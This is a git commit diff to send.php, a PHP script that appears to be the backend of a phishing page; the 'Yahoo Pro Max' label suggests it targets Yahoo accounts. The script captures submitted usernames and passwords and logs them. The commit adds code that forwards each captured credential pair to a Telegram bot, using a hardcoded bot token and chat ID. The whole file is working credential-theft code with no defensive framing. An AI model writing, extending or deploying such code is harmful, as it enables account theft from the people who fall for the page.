b2f68e9bdbb5d697890a9ca875d91c39174f2db3
tolu-ctrl <121352168+tolu-ctrl@users.noreply.github.com>
2025-02-28 07:53:32 -0600

    Update send.php

--- send.php
+++ send.php
@@ -3,11 +3,17 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST['username'];
     $password = $_POST['password'];
 
-    $log = "🔥 Yahoo Pro Max 🔥\nUsername: $username | Password: $password\n";
+    $log = "🔥 Ogun Tracker 🔥\nUsername: $username | Password: $password\n";
 
-    // Railway Logs Storage 🔥
+    // Save to Railway Logs 🔥
     error_log($log);
 
-    echo "Ogun Tracker Active ✅";
+    // Send to Telegram
+    $token = "7632866238:AAFJGMxkD8p18Z8wxnSvf5snHXJN8ZcK9BQ"; // 🔑
+    $chat_id = "1559369377"; // 🔑
+    $msg = urlencode($log);
+    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$msg");
+
+    echo "Ogun Tracker Activated ✅";
 }
 ?>
